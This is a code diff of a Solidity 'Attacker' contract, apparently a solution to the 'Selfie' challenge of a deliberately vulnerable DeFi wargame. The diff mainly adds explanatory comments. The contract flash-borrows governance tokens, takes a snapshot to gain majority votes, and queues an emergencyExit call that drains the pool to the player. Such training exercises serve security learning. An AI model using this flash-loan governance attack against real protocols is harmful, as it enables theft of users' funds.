@@ -26,6 +26,7 @@ contract Attacker is IERC3156FlashBorrower {
   }
 
   function setPayload() public {
+    // get the loan, deliver the payload at onFlashLoan().
     pool.flashLoan(
       IERC3156FlashBorrower(this),
       address(token),
@@ -47,19 +48,26 @@ contract Attacker is IERC3156FlashBorrower {
         uint256,
         bytes calldata
     ) external returns (bytes32) {
-    // ???
+    // since this implements DamnValuableTokenSnapshot,
+    // we can just issue a snapshot.
+    // as we were able to borrow the maximum of the pool,
+    // we will get the majority of the votes.
     governanceToken.snapshot();
 
+    // prepare the payload
+    bytes memory data = abi.encodeWithSelector(
+      ISelfiePool.emergencyExit.selector,
+      player
+    );
 
-    bytes memory data = abi.encodeWithSelector(ISelfiePool.emergencyExit.selector, player);
-
+    // deliver the payload
     governance.queueAction(
       address(pool),
       0,
       data
     );
 
-    // return the loan
+    // return the funds
     token.approve(msg.sender, amount);
     return keccak256("ERC3156FlashBorrower.onFlashLoan");
   }
